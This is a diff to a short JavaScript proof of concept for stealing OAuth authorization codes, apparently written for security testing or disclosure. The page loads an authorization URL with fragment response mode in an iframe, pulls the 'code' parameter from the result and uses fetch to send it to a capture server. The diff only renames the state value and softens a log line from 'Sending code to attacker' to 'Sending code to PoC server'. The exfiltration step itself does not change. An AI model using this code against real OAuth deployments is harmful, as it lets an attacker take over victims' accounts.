@@ -7,7 +7,7 @@ const authorizationURL =
     "&redirect_uri=" +
     encodeURIComponent("http://127.0.0.1:8000/oauth/callback") +
     "&response_mode=fragment" +
-    "&state=attack-state";
+    "&state=fooooooooo";
 
 const iframe = document.createElement("iframe");
 
@@ -28,11 +28,10 @@ iframe.onload = () => {
     );
 
     const code = params.get("code");
-
     console.log("[+] code:", code);
 
     const captureURL = "http://127.0.0.1:9000/capture?code=" + encodeURIComponent(code);
-    console.log("[+] Sending code to attacker...");
+    console.log("[+] Sending code to PoC server");
     fetch(captureURL, {
         mode: "no-cors"
     });
@@ -41,6 +40,4 @@ iframe.onload = () => {
 
 document.body.appendChild(iframe);
 console.log("[+] OAuth iframe created");
-
-
 </script>
